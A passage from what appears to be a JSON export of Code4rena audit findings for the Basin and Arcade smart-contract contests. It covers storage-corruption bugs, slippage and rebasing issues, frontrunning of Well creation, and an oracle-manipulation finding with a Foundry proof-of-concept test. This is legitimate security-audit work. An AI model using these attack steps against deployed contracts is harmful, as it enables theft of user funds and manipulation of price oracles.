https://github.com/code-423n4/2023-07-basin/blob/c1b72d4e372a6246e0efbd57b47fb4cbb5d77062/src/libraries/LibLastReserveBytes.sol#L58   # Vulnerability details  ## Description  The MultiFlowPump contract stores reserve counts on every update, using the libraries LibBytes16 and LibLastReserveBytes. Those libs pack `bytes16` values efficiently with the `storeBytes16()` and `storeLastReserves` functions. In case of an odd number of items, the last storage slot will be half full. Care must be taken to not step over the previous value in that slot. This is done correctly in `LibBytes`: ```solidity if (reserves.length & 1 == 1) {     require(reserves[reserves.length - 1] <= type(uint128).max, \"ByteStorage: too large\");     iByte = maxI * 64;     assembly {         sstore(             // @audit - overwrite SLOT+MAXI*32             add(slot, mul(maxI, 32)),                                                        // @audit - read SLOT+MAXI*32 (2nd entry)             add(mload(add(reserves, add(iByte, 32))), shl(128, shr(128, sload(add(slot, mul(maxI, 32))))))         )     } } ```  As can be seen, it overwrites the slot with the previous 128 bits in the upper half of the slot, only setting the lower 128 bytes.  However, the wrong slot is read in the other two libraries. For example, in `storeLastReserves()`: ```solidity if (reserves.length & 1 == 1) {     iByte = maxI * 64;     assembly {         sstore(             // @audit - overwrite SLOT+MAXI*32             add(slot, mul(maxI, 32)),                                                       // @audit - read SLOT+MAXI (2nd entry)??             add(mload(add(reserves, add(iByte, 32))), shr(128, shl(128, sload(add(slot, maxI)))))         )     } } ```  The error is not multiplying `maxI` before adding it to `slot`. This means that the reserves count encoded in lower 16 bytes in `add(slot, mul(maxI, 32))` will have the value of a reserve in a much lower index.  Slots are used in 32 byte increments, i.e. S, S+32, S+64... When `maxI==0`, the intended slot and the actual slot overlap. When `maxI` is 1..31, the read slot happens to be zero (unused), so the first actual corruption occurs on `maxI==32`. By substitution, we get: `SLOT[32*32] = correct reserve | SLOT[32]` In other words, the 4rd reserve (stored in lower 128 bits of  `SLOT[32]`) will be written to the 64th reserve.   The Basin pump is intended to support an arbitrary number of reserves safely, therefore the described storage corruption impact is in scope.  ## Impact  Reserve amounts in the pump will be corrupted, resulting in wrong oracle values.  ## POC  1. A reserve update is triggered on the pump when some Well action occurs. 2. Suppose reserves are array `[0,1,2,...,63,64]` 3. Reserve count is odd, so affected code block is reached 4. `SLOT[32*32] = UPPER: 64 | LOWER: SLOT[32] = 64 | 3`   ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Change the `sload()` operation in both affected functions to `sload(add(slot, mul(maxI, 32)`   ## Assessed type  en/de-code"}, {"title": "Due to bit-shifting errors, reserve amounts in the pump will be corrupted, resulting in wrong oracle values", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/259", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-07-basin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-basin/blob/c1b72d4e372a6246e0efbd57b47fb4cbb5d77062/src/libraries/LibBytes16.sol#L45   # Vulnerability details  ## Description  It is advised to first read finding: `Due to slot confusion, reserve amounts in the pump will be corrupted, resulting in wrong oracle values`, which provides all the contextual information for this separate bug.  We've discussed how a wrong `sload()` source slot leads to corruption of the reserves. In `LibBytes16`, another confusion occurs. Recall the correct storage overwriting done in `LibBytes`: ```solidity assembly {     sstore(         // @audit - overwrite SLOT+MAXI*32         add(slot, mul(maxI, 32)),                                                    // @audit - read SLOT+MAXI*32 (2nd entry)         add(mload(add(reserves, add(iByte, 32))), shl(128, shr(128, sload(add(slot, mul(maxI, 32))))))     ) } ```  Importantly, it **clears** the lower 128 bytes of the source slot and replaces the upper 128 bytes of the dest slot using the upper 128 bytes of  the source slot: `shl(128,shr(128,SOURCE))`  In `storeBytes16()`, the `shl()` operation has been discarded. This means the code will use the upper 128 bytes of SOURCE to overwrite the lower 128 bytes in DEST. ``` if (reserves.length & 1 == 1) {     iByte = maxI * 64;     assembly {         sstore(         // @audit - overwrite SLOT+MAXI*32             add(slot, mul(maxI, 32)),                                                     // @audit - overwrite lower 16 bytes with upper 16 bytes?             add(mload(add(reserves, add(iByte, 32))), shr(128, sload(add(slot, maxI))))         )     } } ```  In other words, regardless of the SLOT being read, instead of keeping the lower 128 bits as is, it stores whatever happens to be in the upper 128 bits. Note this is a **completely** different error from the slot confusion, which happens to be in the same line of code.  ## Impact  Reserve amounts in the pump will be corrupted, resulting in wrong oracle values  ## POC  Assume slot confusion bug has been corrected for clarity.  1. A reserve update is triggered on the pump when some Well action occurs. 2. Suppose reserves are array `[0,1,2,...,63,64]` 3. Suppose previous reserves are array `[P0,P1,...,P64]` 4. Reserve count is odd, so affected code block is reached 5. `SLOT[32*32] = UPPER: 64 | LOWER: UPPER(SLOT[32*32]) = 64 | P64`   ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Replace the affected line with the calculation below: `shr(128, shl(128, SLOT))` This will use the lower 128 bytes and clear the upper 128 bytes,as intended.   ## Assessed type  en/de-code"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/251", "labels": ["bug", "G (Gas Optimization)", "grade-a", "high quality report", "sponsor confirmed", "G-05"], "target": "2023-07-basin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-basin-findings/blob/main/data/JCN-G.md)."}, {"title": "removeLiquidity(), addLiquidity(), removeLiquidityImbalanced() functions may give unexpected results", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/224", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-07-basin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L550 https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L462 https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L402 https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L63-L65   # Vulnerability details  ## Impact The input parameter of the function is minTokenAmountsOut[] (either tokenAmountsIn[] or tokenAmountsOut[] depending on the function). The requirement for this parameter is: MUST match the {Well.tokens} indexing.  However, suppose that the order of the tokens was changed in memory before the minTokenAmountsOut (tokenAmountsOut) array was entered. For example, if necessary, some token was deleted. The order of the tokens will then shift to the left based on the design of the service (no other way, because each token must follow each other in memory for correct functioning https://github.com/code-423n4/2023-07-basin/ blob/main/src/Well.sol#L63-L65).  The user will send the wrong transaction and get the wrong result.  ## Proof of Concept 1. The user is preparing to send the removeLiquidityImbalanced transaction. Introduces minTokenAmountsOut[] (tokenAmountsIn[], tokenAmountsOut[]). 2. At this point, one or more tokens are removed from memory. The order of the tokens is shifted. (https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L63-L65) 3. The user sends the wrong transaction and gets an unexpected result.  ## Tools Used Manual review  ## Recommended Mitigation Steps check the order of tokens in minTokenAmountsOut[] (tokenAmountsIn[], tokenAmountsOut[]) and in memory.   ## Assessed type  Context"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/220", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-15"], "target": "2023-07-basin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-basin-findings/blob/main/data/Kaysoft-Q.md)."}, {"title": "The fee on transfer from the outgoing token is not accounted in the slippage when swapping", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/219", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "satisfactory", "sponsor confirmed", "duplicate-110", "Q-16"], "target": "2023-07-basin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Well.sol#L215-L240   # Vulnerability details  ## Impact  Slippage may not be accounted for accurately.  ## Proof of Concept  Well.sol accepts fee-on-transfer tokens, as seen in the NATSPEC and the functions.  ```     function swapFromFeeOnTransfer( ```  The feeOnTransfer token can be either the incoming token or the outgoing token or both. Let's focus on the outgoing token. When a user wants to swap tokenX to tokenY (take tokenX as fee-on-transfer), he calls `swapFromFeeOnTransfer()` which calls `_swapFrom()`. `_swapFrom()` does the necessary checks and updates before calculating the `amountOut`. The function then checks that `amountOut` must be greater than `minAmountOut` before transferring the `amountOut` value to the user.  ```         amountOut = reserveJBefore - reserves[j];         if (amountOut < minAmountOut) {             revert SlippageOut(amountOut, minAmountOut);         }           toToken.safeTransfer(recipient, amountOut);         emit Swap(fromToken, toToken, amountIn, amountOut, recipient); ```  However, the fee for transferring the `amountOut` to the user is not accounted in the `minAmountOut` variable, which means that the fee for transferring is not included in the slippage.  For example, if tokenY has a 10% transfer fee.  - Alice wants to swap 100 tokenX for a desired 100 tokenY.  - Her minAmount received for tokenY is 95.  - When swapping, the initial amount that she will be getting before fees is 97 tokenY. - Since her amount out, 97, is greater than min amount, 95, the slippage check will pass. - However, during the transfer, since the percentage is 10%, Alice will only get ~87 tokens, which is lesser than her minAmount. The slippage check fails to consider the fee when transferring tokens.  ## Tools Used  VSCode  ## Recommended Mitigation Steps  When interacting with fee on transfer tokens, the slippage check should be done after the transfer to account for the transfer fee.  ```         amountOut = reserveJBefore - reserves[j]; -       if (amountOut < minAmountOut) { -           revert SlippageOut(amountOut, minAmountOut); -       }          -       toToken.safeTransfer(recipient, amountOut);  +       uint256 balanceBefore = toToken.balanceOf(recipient); +       token.safeTransfer(recipient, amountOut); +       amountTransferred = toToken.balanceOf(recipient) - balanceBefore;        +       if (amountTransferred < minAmountOut) { +           revert SlippageOut(amountOut, minAmountOut); +       }           emit Swap(fromToken, toToken, amountIn, amountOut, recipient); ```   ## Assessed type  Token-Transfer"}, {"title": "_swapFrom would revert from underflow when a pool has a rebase token; and the post-swap output token balance becomes bigger than the last cached value", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/200", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-07-basin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L232   # Vulnerability details  ## Impact _swapFrom would revert from underflow when a pool has a rebase token; and the post-swap output token balance becomes bigger than the last cached value.  During a swap, the core function `_swapFrom` would fetch each reserve token balance from storage slot by using `_updatePumps` , and get the output amount by calling `_calcReserve`; input and output tokenAmount are properly accounted with minimum output enforced.  However, this cached approach does not work well with rebasing token like stETH, Consider:  1. there are 100 stETH in the AMA, with 100 tokenX, both are recorded in the reserve balance slot. 2. After time T; there are 100.1 stETH due to rebasing, and 100 tokenX. 3. a user comes in to swap out 0.005 stETH, the output of `_calcReserve` makes use of the latest balance to compute the post-swap balance, leading to 100.05.  ```solidity     function _swapFrom( ...         uint256 reserveJBefore = reserves[j];         reserves[j] = _calcReserve(wellFunction(), reserves, j, totalSupply());          // Note: The rounding approach of the Well function determines whether         // slippage from imprecision goes to the Well or to the User. @underflow        amountOut = reserveJBefore - reserves[j]; ... ``` amountOut is computed by assuming the result from `_calcReserve` to be implicitly smaller than the last cached reserve balance; this is not necessarily true for a rebasing token; Since `_calcReserve` is an external call on a composable function, some would use latest balance of the reserve token to compute, leading to underflow and reverting the swap.  Impact: rebasing token AMM could revert small swap(s), and revert increasingly larger swap with inactivity.(stale cache)  ## Proof of Concept NA  ## Tools Used  ## Recommended Mitigation Steps One solution is to call `_setReserve` to update balanceOf of each reserve against latest balanceOf before executing a swap.   ## Assessed type  Math"}, {"title": "shift (sync, skim) should add deadline checks", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/189", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden"], "target": "2023-07-basin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L352 https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L603 https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L590   # Vulnerability details  ## Impact Users are more likely to suffer from front-running/sandwich attacks and more slippage.  ## Proof of Concept To reduce the gas needed in a multi-step swap, we implement a shift() function, which directly gets amountOut using _tokens[i].balanceOf(address(this)) as reserves and send out tokens to the recipient.  However, unlike other \"swap/write\" functions, we didn't add deadline checks for shift(). This will make users more likely to suffer from front-running/sandwich attacks and more slippage.  It may also be valuable to add deadline checks for sync and skim functions since they impact user's income.  ## Tools Used Manual Review.  ## Recommended Mitigation Steps Add deadline modifier for shift(): ```solidity     function shift(         IERC20 tokenOut,         uint256 minAmountOut,         address recipient,         uint256 deadline     ) external nonReentrant expire(deadline) returns (uint256 amountOut) { ```      ## Assessed type  Invalid Validation"}, {"title": "boreWell can be frontrun/DoS-d", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/181", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-07"], "target": "2023-07-basin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-basin/blob/c1b72d4e372a6246e0efbd57b47fb4cbb5d77062/src/Aquifer.sol/#L48   # Vulnerability details  ## Impact  The boreWell function in the Aquifer contract is responsible for creating new Wells. However, there are two critical security issues:  1. **Stealing of user's deposit amount**: The public readability of the `salt` parameter allows an attacker to frontrun a user's transaction and capture the deposit amount intended for the user's Well. By creating a Well with the same `salt` value, the attacker can receive the deposit intended for the user's Well and withdraw the funds. 2. **DoS for boreWell**: Another attack vector involves an attacker deploying a Well with the same `salt` value as the user's intended Well. This causes the user's transaction to be reverted, resulting in a denial-of-service (DoS) attack on the boreWell function. The attacker can repeatedly execute this attack, preventing users from creating new Wells.  ## Proof of Concept  ### Stealing of user's deposit amount  If a user intends to create a new Well and deposit funds into it, an attacker can frontrun the user's transactions and capture the deposit amount. Here is how the attack scenario unfolds:  1. The user broadcasts two transactions: the first to create a Well with a specific `salt` value, and the second to deposit funds into the newly created Well. 2. The attacker views these pending transactions and frontruns them by creating a Well for themselves using the same `salt` value. 3. The attacker's Well gets created with the same address that the user was expecting for their Well. 4. As a result, the user's create Well transaction gets reverted, but the deposit transaction successfully executes, depositing the funds into the attacker's Well. 5. Being the owner of the Well, the attacker can simply withdraw the deposited funds from the Well.  ### DoS for boreWell  In this attack scenario, an attacker can forcefully revert a user's create Well transaction by deploying a Well for themselves using the user's `salt` value. Here are the steps of the attack:  1. The user broadcasts a create Well transaction with a specific `salt` value. 2. The attacker frontruns the user's transaction and creates a Well for themselves using the same `salt` value. 3. As a result, the user's original create Well transaction gets reverted since the attacker's Well already exists at the predetermined address. 4. This attack can be repeated multiple times, effectively causing a denial-of-service (DoS) attack on the boreWell function.  ## Tools Used  vscode  ## Recommended Mitigation Steps  To mitigate the identified security issues, it is recommended to make the upcoming Well address user-specific by combining the `salt` value with the user's address. This ensures that each user's Well has a unique address and prevents frontrunning attacks and DoS attacks. The following code snippet demonstrates the recommended modification:  ``` well = implementation.cloneDeterministic(     keccak256(abi.encode(msg.sender, `salt`)) );  ```   ## Assessed type  Other"}, {"title": "Treating of BLOCK_TIME as permanent will cause serious economic flaws in the oracle when block times change", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/176", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-08"], "target": "2023-07-basin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-basin/blob/c1b72d4e372a6246e0efbd57b47fb4cbb5d77062/src/pumps/MultiFlowPump.sol#L39   # Vulnerability details  ## Description  Pumps receive the chain BLOCK_TIME in the constructor. In every update, it is used to calculate the `blocksPassed` variable, which determines what is the maximum change in price (done in `_capReserve()`).  The issue is that BLOCK_TIME is an immutable variable in the pump, which is immutable in the Well, meaning it is basically set in stone and can only be changed through a Well redeploy and liquidity migration (very long cycle). However, BLOCK_TIME actually changes every now and then, especially in L2s.For example, the recent Bedrock upgrade in Optimism completely [changed](https://community.optimism.io/docs/developers/bedrock/differences/#the-evm) the block time generation. It is very clear this will happen many times over the course of Basin's lifetime.  When a wrong BLOCK_TIME is used, the `_capReserve()` function will either limit price changes too strictly, or too permissively. In the too strict case, this would cause larger and large deviations between the oracle pricing and the real market prices, leading to large arb opportunities. In the too permissive case, the function will not cap changes like it is meant too, making the oracle more manipulatable than the economic model used when deploying the pump.  ## Impact  Treating of BLOCK_TIME as permanent will cause serious economic flaws in the oracle when block times change.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  The BLOCK_TIME should be changeable, given a long enough freeze period where LPs can withdraw their tokens if they are unsatisfied with the change.   ## Assessed type  Timing"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/147", "labels": ["bug", "G (Gas Optimization)", "grade-a", "high quality report", "sponsor confirmed", "G-16"], "target": "2023-07-basin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-basin-findings/blob/main/data/lsaudit-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/141", "labels": ["bug", "G (Gas Optimization)", "grade-b", "high quality report", "sponsor confirmed", "G-17"], "target": "2023-07-basin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-basin-findings/blob/main/data/DavidGiladi-G.md)."}, {"title": "Pumps are not updated in the shift() and sync() functions, allowing oracle manipulation", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/136", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-07-basin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Well.sol#L352-L377 https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/Well.sol#L590-L598   # Vulnerability details  ## Vulnerability details  The `Wall` contract mandates that the `Pumps` should be updated with the previous block's `reserves` in case `reserves` are changed in the current block to reflect the price change accurately.  However, this doesn't happen in the `shift()` and `sync()` functions, providing an opportunity for any user to manipulate the `reserves` in the current block before updating the `Pumps` with new manipulated `reserves` values.  ## Impact  The `Pumps` (oracles) can be manipulated. This can affect any contract/protocol that utilizes `Pumps` as on-chain oracles.  ## Proof of Concept  1. A malicious user performs a `shift()` operation to update `reserve`s to desired amounts in the current block, thereby overriding the `reserves` from the previous block. 2. The user performs `swapFrom()/swapTo()` operations to extract back the funds used in the `shift()` function. As a result, the attacker is not affected by any arbitration as pool `reserves` revert back to the original state. 3. The `swapFrom()/swapTo()` operations trigger the `Pumps` update with invalid `reserves`, resulting in oracle manipulation.  Note: The `sync()` function can also manipulate `reserves` in the current block, but it's less useful than `shift()` from an attacker's perspective.  ## PoC Tests  This test illustrates how to use `shift()` to manipulate `Pumps` data.  Create `test/pumps/Pump.Manipulation.t.sol` and run `forge test --match-test manipulatePump`.  ```solidity // SPDX-License-Identifier: MIT pragma solidity ^0.8.17;  import {TestHelper, Call} from \"../TestHelper.sol\"; import {MultiFlowPump} from \"src/pumps/MultiFlowPump.sol\"; import {from18} from \"test/pumps/PumpHelpers.sol\";  contract PumpManipulationTest is TestHelper {     MultiFlowPump pump;      function setUp() public {         pump = new MultiFlowPump(             from18(0.5e18), // cap reserves if changed +/- 50% per block             from18(0.5e18), // cap reserves if changed +/- 50% per block             12, // block time             from18(0.9e18) // ema alpha         );          Call[] memory _pumps = new Call[](1);         _pumps[0].target = address(pump);         _pumps[0].data = new bytes(0);          setupWell(2,_pumps);     }      function test_manipulatePump() public prank(user) {         uint256 amountIn = 1 * 1e18;          // 1. equal swaps, reserves should be unchanged         uint256 amountOut = well.swapFrom(tokens[0], tokens[1], amountIn, 0, user, type(uint256).max);         well.swapFrom(tokens[1], tokens[0], amountOut, 0, user, type(uint256).max);          uint256[] memory lastReserves = pump.readLastReserves(address(well));         assertApproxEqAbs(lastReserves[0], 1000 * 1e18, 1);         assertApproxEqAbs(lastReserves[1], 1000 * 1e18, 1);          // 2. equal shift + swap, reserves should be unchanged (but are different)         increaseTime(120);                  tokens[0].transfer(address(well), amountIn);         amountOut = well.shift(tokens[1], 0, user);         well.swapFrom(tokens[1], tokens[0], amountOut, 0, user, type(uint256).max);          lastReserves = pump.readLastReserves(address(well));         assertApproxEqAbs(lastReserves[0], 1000 * 1e18, 1);         assertApproxEqAbs(lastReserves[1], 1000 * 1e18, 1);     } } ```  ## Tools Used  Manual review, Foundry  ## Recommended Mitigation Steps  Update `Pumps` in the `shift()` and `sync()` function.  ```diff     function shift(         IERC20 tokenOut,         uint256 minAmountOut,         address recipient     ) external nonReentrant returns (uint256 amountOut) {         IERC20[] memory _tokens = tokens(); -       uint256[] memory reserves = new uint256[](_tokens.length); +       uint256[] memory reserves = _updatePumps(_tokens.length); ```  ```diff     function sync() external nonReentrant {         IERC20[] memory _tokens = tokens(); -       uint256[] memory reserves = new uint256[](_tokens.length); +       uint256[] memory reserves = _updatePumps(_tokens.length); ```   ## Assessed type  Oracle"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/124", "labels": ["bug", "G (Gas Optimization)", "grade-b", "high quality report", "sponsor confirmed", "G-18"], "target": "2023-07-basin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-basin-findings/blob/main/data/0xAnah-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/119", "labels": ["bug", "grade-b", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-37"], "target": "2023-07-basin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-basin-findings/blob/main/data/MohammedRizwan-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/118", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-38"], "target": "2023-07-basin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-basin-findings/blob/main/data/TheSavageTeddy-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/116", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-39"], "target": "2023-07-basin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-basin-findings/blob/main/data/Eeyore-Q.md)."}, {"title": "Reserves larger than uint104 will be overwritten", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/114", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "satisfactory", "sponsor confirmed", "edited-by-warden"], "target": "2023-07-basin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-basin/blob/9403cf973e95ef7219622dbbe2a08396af90b64c/src/libraries/LibLastReserveBytes.sol#L23-L37   # Vulnerability details  ## Impact  LibLastReserveBytes packages data together, and bytes16 reserve is treated as bytes14. When reserve is greater than bytes14 and smaller than bytes16, data will be overwritten, resulting in well imbalance.  ## Proof of Concept  ```solidity         assembly {             sstore(                 slot,                 or(                     or(shl(208, lastTimestamp), shl(248, n)),                     or(shl(104, shr(152, mload(add(reserves, 32)))), shr(152, mload(add(reserves, 64))))                 )             )         } ```  LibLastReserveBytes packages data together as `bytes1 n`, `bytes5 lastTimestamp`, `bytes12 reserves[0]`, `bytes12 reserves[1]`. But reserves are passed as `bytes16[]`, and there is no check reserve less than `uint104`, and I can't find any explanation in the documentation and code base, except for a limitation in the test file.   Given that the well can be deployed permissionlesly, the result of reserve overwriting are catastrophic, reserve shrinking to uint104 in an instant, with a large number of tokens locked in the well. ```shell 2 ** 104 = 202824 * 1e8 * 1e18 ``` For meme coins or high decimal tokens, uint104 may only be worth millions, it is possible to reach the limit.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  Added a uint104 maximum limit         ## Assessed type  Math"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/92", "labels": ["bug", "G (Gas Optimization)", "grade-b", "high quality report", "sponsor confirmed", "edited-by-warden", "G-20"], "target": "2023-07-basin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-basin-findings/blob/main/data/mahdirostami-G.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/66", "labels": ["analysis-advanced", "grade-a", "high quality report", "sponsor confirmed", "A-06"], "target": "2023-07-basin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-basin-findings/blob/main/data/oakcobalt-Analysis.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/59", "labels": ["bug", "G (Gas Optimization)", "grade-a", "high quality report", "sponsor confirmed", "G-23"], "target": "2023-07-basin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-basin-findings/blob/main/data/oakcobalt-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/51", "labels": ["bug", "G (Gas Optimization)", "grade-a", "high quality report", "sponsor confirmed", "G-24"], "target": "2023-07-basin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-basin-findings/blob/main/data/0xn006e7-G.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-07-basin-findings/issues/27", "labels": ["analysis-advanced", "grade-b", "high quality report", "sponsor confirmed", "A-07"], "target": "2023-07-basin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-basin-findings/blob/main/data/K42-Analysis.md)."}, {"title": "Approve of zero in ArcadeTreasury.sol:gscApprove should be allowed", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/518", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-07-arcade-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ArcadeTreasury.sol#L195   # Vulnerability details  ## Impact GSC can't cancel an approval in the past.  ## Proof of Concept In [EIP-20](https://eips.ethereum.org/EIPS/eip-20#approve), we use approve(spender, 0) to cancel an approval in the past. And the spec states \"clients SHOULD make sure to create user interfaces in such a way that they set the allowance first to 0 before setting it to another value for the same spender\".  In short, approving to zero is normal for ERC-20 token use cases. However, in ArcadeTreasury.sol:gscApprove, we disallow this behavior:  ```solidity     function gscApprove(         address token,         address spender,         uint256 amount     ) external onlyRole(GSC_CORE_VOTING_ROLE) nonReentrant {         if (spender == address(0)) revert T_ZeroAddress(\"spender\");         if (amount == 0) revert T_ZeroAmount();          // Will underflow if amount is greater than remaining allowance         gscAllowance[token] -= amount;          _approve(token, spender, amount, spendThresholds[token].small);     } ```  ## Tools Used Manual Review.  ## Recommended Mitigation Steps Remove the amount == 0 check.   ## Assessed type  ERC20"}, {"title": "Expiration in token airdrop is not inclusive of multiple airdrops and cannot be changed making contract unusable", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/495", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-07-arcade-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/token/ArcadeToken.sol#L74-L171   # Vulnerability details  ## Impact The expiration time stamp set in the constructor is one time thing and there is no setter function to change and for multiple airdrops, initial expiration may become obsolete and even on changing the merkle root the airdrop cannot happen.  ## Proof of Concept Consider the following scenerio:  1. Airdrop is decided the be happen.Contract deployed all params set, expiration is 1 month from now. 2. Merkle root is set by the owner for the beneficiaries to claim the airdrop using the following functions: ```solidity     function setMerkleRoot(bytes32 _merkleRoot) external onlyOwner {         rewardsRoot = _merkleRoot;          emit SetMerkleRoot(_merkleRoot);     } ``` 3. Now users can claim the airdrop using the the following function from `ArcadeMerkleRewards.sol`: ```solidity     function claimAndDelegate(address delegate, uint128 totalGrant, bytes32[] calldata merkleProof) external {         // must be before the expiration time         if (block.timestamp > expiration) revert AA_ClaimingExpired();         // no delegating to zero address         if (delegate == address(0)) revert AA_ZeroAddress(\"delegate\");         // validate the withdraw         _validateWithdraw(totalGrant, merkleProof);          // approve the voting vault to transfer tokens         token.approve(address(votingVault), uint256(totalGrant));         // deposit tokens in voting vault for this msg.sender and delegate         votingVault.airdropReceive(msg.sender, totalGrant, delegate);     } ``` Reward claimed and delegated. All good for the first iteration. One month has passed.  But lets say now arcade wants to do the airdrop again to same or different set of addresses. Merkle root is set with generated from the beneficiaries data (address, claimable amount) etc. Ideally this should have worked but the catch is expiration have passed and cannot be changed. So the this contract becomes useless now leading the team to do the costly redeploy and transactions once again. ## Tools Used Manual review ## Recommended Mitigation Steps Make a setter function for the expiration to be able to make multiple airdrops over different period of time, each with its own expiration.   ## Assessed type  DoS"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/485", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-05"], "target": "2023-07-arcade-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-arcade-findings/blob/main/data/BugBusters-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/467", "labels": ["bug", "grade-b", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-07"], "target": "2023-07-arcade-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-arcade-findings/blob/main/data/immeas-Q.md)."}, {"title": "NFTBoostVault.sol doesn't comply with ERC-1155 Token Receiver requests", "html_url": "https://github.com/code-423n4/2023-07-arcade-findings/issues/447", "labels": ["bug", "disagree with severity", "downgraded by 